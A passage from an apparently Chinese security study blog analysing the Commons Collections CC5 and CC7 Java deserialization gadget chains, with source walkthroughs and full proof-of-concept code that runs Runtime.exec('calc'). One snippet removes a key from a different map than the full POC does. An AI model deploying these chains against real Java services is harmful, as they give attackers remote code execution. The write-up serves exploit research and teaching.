src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509021855986.png"></p><h2 id="POC："><a href="#POC：" class="headerlink" title="POC："></a>POC：</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.CC5;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.keyvalue.TiedMapEntry;<br><br><span class="hljs-keyword">import</span> javax.management.BadAttributeValueExpException;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC5Test</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br>        <span class="hljs-comment">// CC1-LazyMap</span><br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>        &#125;;<br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br>        <span class="hljs-type">HashMap</span> <span class="hljs-variable">map</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">lazymap</span> <span class="hljs-operator">=</span> LazyMap.decorate(map, chainedTransformer);<br><br>        <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tiedMapEntry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(lazymap,<span class="hljs-string">&quot;key&quot;</span>);<br>        tiedMapEntry.toString();<br><br>        <span class="hljs-type">BadAttributeValueExpException</span> <span class="hljs-variable">badAttributeValueExpException</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BadAttributeValueExpException</span>(<span class="hljs-literal">null</span>);<br><br>        <span class="hljs-comment">//反射修改 BadAttributeValueExpException 的 val 值</span><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;javax.management.BadAttributeValueExpException&quot;</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">val</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;val&quot;</span>);<br>        val.setAccessible(<span class="hljs-literal">true</span>);<br>        val.set(badAttributeValueExpException,tiedMapEntry);<br>        serialize(badAttributeValueExpException);<br>        unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br><br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        oos.writeObject(obj);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String Filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException&#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(Filename));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509021855664.png"></p><h1 id="CC7"><a href="#CC7" class="headerlink" title="CC7"></a>CC7</h1><h2 id="分析：-3"><a href="#分析：-3" class="headerlink" title="分析："></a>分析：</h2><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509021855345.png"></p><p>CC7 的入口点变成了： HashTable.readObject</p><p>HashTable 中的 readObject 调用了 <font style="color:#080808;background-color:#ffffff;">reconstitutionPut</font></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509021855669.png"></p><p><font style="color:#080808;background-color:#ffffff;">reconstitutionPut中调用了 equals ,</font></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509021855139.png"></p><p>因为 LazyMap 不存在 equals 方法，然后找到它的父类 AbstractMapDecorator 调用 equals </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509021855169.png"></p><p>找到 AbstractMap.equals 中调用了 get 方法</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509021855646.png"></p><h2 id="构造POC："><a href="#构造POC：" class="headerlink" title="构造POC："></a>构造POC：</h2><h3 id="AbstractMap-equals"><a href="#AbstractMap-equals" class="headerlink" title="AbstractMap.equals"></a>AbstractMap.equals</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">abstract</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AbstractMap</span>&lt;K,V&gt; <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Map</span>&lt;K,V&gt; &#123;<br>    ...<br>    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">equals</span><span class="hljs-params">(Object o)</span> &#123;<br>    <span class="hljs-comment">//判断传入的是否为同一对象</span><br>    <span class="hljs-keyword">if</span> (o == <span class="hljs-built_in">this</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br><br>    <span class="hljs-comment">//类型检查</span><br>    <span class="hljs-keyword">if</span> (!(o <span class="hljs-keyword">instanceof</span> Map))<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    Map&lt;?,?&gt; m = (Map&lt;?,?&gt;) o;<br>    <span class="hljs-comment">//比较两个 map 的 size() </span><br>    <span class="hljs-keyword">if</span> (m.size() != size())<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br><br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-comment">//entrySet() 的迭代器，用于遍历所有键值对（Entry&lt;K,V&gt;）</span><br>        Iterator&lt;Entry&lt;K,V&gt;&gt; i = entrySet().iterator();<br>        <span class="hljs-comment">//遍历每一个映射条目，取出 key 和 value，准备与另一个 map m 中对应的值做比较</span><br>        <span class="hljs-keyword">while</span> (i.hasNext()) &#123;<br>            Entry&lt;K,V&gt; e = i.next();<br>            <span class="hljs-type">K</span> <span class="hljs-variable">key</span> <span class="hljs-operator">=</span> e.getKey();<br>            <span class="hljs-type">V</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> e.getValue();<br>            <br>            <span class="hljs-keyword">if</span> (value == <span class="hljs-literal">null</span>) &#123;<br>                <span class="hljs-comment">//value == null 进入</span><br>                <span class="hljs-keyword">if</span> (!(m.get(key)==<span class="hljs-literal">null</span> &amp;&amp; m.containsKey(key)))<br>                    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-keyword">if</span> (!value.equals(m.get(key)))<br>                    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>            &#125;<br>        &#125;<br>    &#125; <span class="hljs-keyword">catch</span> (ClassCastException unused) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125; <span class="hljs-keyword">catch</span> (NullPointerException unused) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br>    ...<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="Hashtable-reconstitutionPut"><a href="#Hashtable-reconstitutionPut" class="headerlink" title="Hashtable.reconstitutionPut"></a><font style="color:rgb(44, 62, 80);">Hashtable.</font><font style="color:#080808;background-color:#ffffff;">reconstitutionPut</font></h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">reconstitutionPut</span><span class="hljs-params">(Entry&lt;?,?&gt;[] tab, K key, V value)</span><br><span class="hljs-keyword">throws</span> StreamCorruptedException<br>&#123;<br>    <span class="hljs-keyword">if</span> (value == <span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.io.StreamCorruptedException();<br>    &#125;<br>    <span class="hljs-comment">// Makes sure the key is not already in the hashtable.</span><br>    <span class="hljs-comment">// This should not happen in deserialized version.</span><br>    <span class="hljs-comment">//计算 key 的哈希值</span><br>    <span class="hljs-type">int</span> <span class="hljs-variable">hash</span> <span class="hljs-operator">=</span> key.hashCode();<br>    <span class="hljs-comment">//% tab.length 将哈希值映射到数组索引范围</span><br>    <span class="hljs-type">int</span> <span class="hljs-variable">index</span> <span class="hljs-operator">=</span> (hash &amp; <span class="hljs-number">0x7FFFFFFF</span>) % tab.length;<br>    <span class="hljs-comment">//从 tab[index] 中将 Entry 放入循环</span><br>    <span class="hljs-keyword">for</span> (Entry&lt;?,?&gt; e = tab[index] ; e != <span class="hljs-literal">null</span> ; e = e.next) &#123;<br>        <span class="hljs-comment">//先 e.hash == hash，比较已有元素和新元素的hash是否相同</span><br>        <span class="hljs-comment">//一样之后，接着调用 e.key.equals(key)，比较已有元素的key和新的key是否相同</span><br>        <span class="hljs-keyword">if</span> ((e.hash == hash) &amp;&amp; e.key.equals(key)) &#123;<br>            <span class="hljs-comment">//如果 key重复，抛出异常</span><br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.io.StreamCorruptedException();<br>        &#125;<br>    &#125;<br>    <span class="hljs-comment">// Creates the new entry.</span><br>    <span class="hljs-meta">@SuppressWarnings(&quot;unchecked&quot;)</span><br>    Entry&lt;K,V&gt; e = (Entry&lt;K,V&gt;)tab[index];<br>    tab[index] = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Entry</span>&lt;&gt;(hash, key, value, e);<br>    count++;<br>&#125;<br></code></pre></td></tr></table></figure><p>**注意：首先满足 value !&#x3D; null，之后满足俩个元素的 hash 值相同，然后在判断 key 是否重复时触发 equals 方法 **</p><h3 id="HashTable-readObject"><a href="#HashTable-readObject" class="headerlink" title="HashTable.readObject"></a><font style="color:rgb(26, 32, 44);">HashTable.readObject</font></h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readObject</span><span class="hljs-params">(java.io.ObjectInputStream s)</span><br><span class="hljs-keyword">throws</span> IOException, ClassNotFoundException<br>&#123;<br>    <span class="hljs-comment">// Read in the length, threshold, and loadfactor</span><br>    s.defaultReadObject();<br><br>    <span class="hljs-comment">// Read the original length of the array and number of elements</span><br>    <span class="hljs-type">int</span> <span class="hljs-variable">origlength</span> <span class="hljs-operator">=</span> s.readInt();<br>    <span class="hljs-type">int</span> <span class="hljs-variable">elements</span> <span class="hljs-operator">=</span> s.readInt();<br><br>    <span class="hljs-comment">// Compute new size with a bit of room 5% to grow but</span><br>    <span class="hljs-comment">// no larger than the original size.  Make the length</span><br>    <span class="hljs-comment">// odd if it&#x27;s large enough, this helps distribute the entries.</span><br>    <span class="hljs-comment">// Guard against the length ending up zero, that&#x27;s not valid.</span><br>    <span class="hljs-type">int</span> <span class="hljs-variable">length</span> <span class="hljs-operator">=</span> (<span class="hljs-type">int</span>)(elements * loadFactor) + (elements / <span class="hljs-number">20</span>) + <span class="hljs-number">3</span>;<br>    <span class="hljs-keyword">if</span> (length &gt; elements &amp;&amp; (length &amp; <span class="hljs-number">1</span>) == <span class="hljs-number">0</span>)<br>        length--;<br>    <span class="hljs-keyword">if</span> (origlength &gt; <span class="hljs-number">0</span> &amp;&amp; length &gt; origlength)<br>        length = origlength;<br>    table = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Entry</span>&lt;?,?&gt;[length];<br>    threshold = (<span class="hljs-type">int</span>)Math.min(length * loadFactor, MAX_ARRAY_SIZE + <span class="hljs-number">1</span>);<br>    count = <span class="hljs-number">0</span>;<br><br>    <span class="hljs-comment">// Read the number of elements and then all the key/value objects</span><br>    <span class="hljs-comment">//反序列化</span><br>    <span class="hljs-keyword">for</span> (; elements &gt; <span class="hljs-number">0</span>; elements--) &#123;<br>        <span class="hljs-meta">@SuppressWarnings(&quot;unchecked&quot;)</span><br>        <span class="hljs-type">K</span> <span class="hljs-variable">key</span> <span class="hljs-operator">=</span> (K)s.readObject();<br>        <span class="hljs-meta">@SuppressWarnings(&quot;unchecked&quot;)</span><br>        <span class="hljs-type">V</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> (V)s.readObject();<br>        <span class="hljs-comment">// synch could be eliminated for performance</span><br>        reconstitutionPut(table, key, value);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="构造："><a href="#构造：" class="headerlink" title="构造："></a>构造：</h3><p><strong>ysoserial：</strong></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509021855518.png"></p><p>结合上述代码的分析，ysoserial 这里要写 <strong>俩个 put 的作用</strong>便是：</p><p>在 Hashtable 放入俩个 lazyMap ,制造“冲突”，迫使他们进入</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">for</span> (Entry&lt;?,?&gt; e = tab[index] ; e != <span class="hljs-literal">null</span> ; e = e.next) &#123;<br>        <span class="hljs-keyword">if</span> ((e.hash == hash) &amp;&amp; e.key.equals(key)) &#123;<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.io.StreamCorruptedException();<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><p>同时要让俩个元素的哈希值相同【(e.hash &#x3D;&#x3D; hash)】，然后就会触发 <code>key.equals()</code> 的比较。<br>而 <code>equals()</code> 内部会调用到 <code>LazyMap.get()</code>，最终触发 <code>transformerChain</code> 执行恶意代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//首先创建俩个map</span><br><span class="hljs-type">Map</span> <span class="hljs-variable">hashMap1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">hashMap2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br><br>        <span class="hljs-comment">//俩个元素的hash值一样</span><br>        <span class="hljs-type">Map</span> <span class="hljs-variable">lazyMap1</span> <span class="hljs-operator">=</span> LazyMap.decorate(hashMap1, chainedTransformer);<br>        lazyMap1.put(<span class="hljs-string">&quot;yy&quot;</span>, <span class="hljs-number">1</span>);<br>        <br>        <span class="hljs-type">Map</span> <span class="hljs-variable">lazyMap2</span> <span class="hljs-operator">=</span> LazyMap.decorate(hashMap2, chainedTransformer);<br>        lazyMap2.put(<span class="hljs-string">&quot;zZ&quot;</span>, <span class="hljs-number">1</span>);<br><br><br>        <span class="hljs-type">Hashtable</span> <span class="hljs-variable">hashtable</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hashtable</span>();<br>        hashtable.put(lazyMap1, <span class="hljs-number">1</span>);<br>        hashtable.put(lazyMap2, <span class="hljs-number">1</span>);<br><br>        <span class="hljs-comment">// 这里的问题在urldns 和 CC6 中均有提及</span><br>        <span class="hljs-comment">//https://www.yuque.com/taohuayuanpang/qxcvxi/qvul6kkfwvcanocn#ZLUWn</span><br>        lazyMap1.remove(<span class="hljs-string">&quot;yy&quot;</span>);<br></code></pre></td></tr></table></figure><blockquote><p><font style="color:rgb(44, 62, 80);">hash相同的值：</font></p><p>yy与zZ</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509021856813.png"><br>Ea与FB</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509021856867.png"></p></blockquote><h3 id="完整POC："><a href="#完整POC：" class="headerlink" title="完整POC："></a>完整POC：</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.CC7;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Hashtable;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC7Test</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-comment">// CC1-LazyMap</span><br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>        &#125;;<br><span class="hljs-comment">//        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);</span><br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;&#125;);<br><br><br>        <span class="hljs-type">Map</span> <span class="hljs-variable">hashMap1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">hashMap2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br><br>        <span class="hljs-type">Map</span> <span class="hljs-variable">lazyMap1</span> <span class="hljs-operator">=</span> LazyMap.decorate(hashMap1, chainedTransformer);<br>        lazyMap1.put(<span class="hljs-string">&quot;yy&quot;</span>, <span class="hljs-number">1</span>);<br><br>        <span class="hljs-type">Map</span> <span class="hljs-variable">lazyMap2</span> <span class="hljs-operator">=</span> LazyMap.decorate(hashMap2, chainedTransformer);<br>        lazyMap2.put(<span class="hljs-string">&quot;zZ&quot;</span>, <span class="hljs-number">1</span>);<br><br><span class="hljs-comment">//        System.out.println(lazyMap1.hashCode());</span><br><span class="hljs-comment">//        System.out.println(lazyMap2.hashCode());</span><br><br>        <span class="hljs-type">Hashtable</span> <span class="hljs-variable">hashtable</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hashtable</span>();<br>        hashtable.put(lazyMap1, <span class="hljs-number">1</span>);<br>        hashtable.put(lazyMap2, <span class="hljs-number">1</span>);<br><br>        lazyMap2.remove(<span class="hljs-string">&quot;yy&quot;</span>);<br><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> ChainedTransformer.class;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;iTransformers&quot;</span>);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(chainedTransformer, transformers);<br><br><br>        serialize(hashtable);<br>        unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        